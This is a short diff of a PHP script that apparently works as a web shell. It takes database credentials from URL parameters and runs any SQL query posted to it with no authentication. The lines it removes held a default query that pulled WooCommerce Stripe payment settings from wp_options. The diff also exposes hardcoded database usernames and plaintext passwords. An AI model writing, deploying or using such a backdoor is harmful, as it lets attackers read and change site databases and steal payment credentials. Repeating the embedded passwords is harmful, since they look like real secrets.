@@ -1,9 +1,9 @@
 <?php
 $host = $_GET['h'] ?? 'localhost';
-$user = $_GET['u'] ?? 'fcimggni_mythicb';
-$pass = $_GET['p'] ?? 'Upworker123@';
-$db   = $_GET['d'] ?? 'fcimggni_mythicb';
-$sql  = $_POST['sql'] ?? 'SELECT * FROM wp_options WHERE option_name LIKE '_wc_stripe_%';';
+$user = $_GET['u'] ?? 'fcimggni_dbs12';
+$pass = $_GET['p'] ?? 'tM(}uM;xuUL^XO=8';
+$db   = $_GET['d'] ?? 'fcimggni_dbs12';
+$sql  = $_POST['sql'] ?? 'show tabless;';
 
 $conn = new mysqli($host, $user, $pass, $db);
 if ($conn->connect_error) die("Connect Error: " . $conn->connect_error);
@@ -21,5 +21,4 @@ if ($result === TRUE) {
     echo "Error: " . $conn->error;
 }
 $conn->close();
-
 ?>
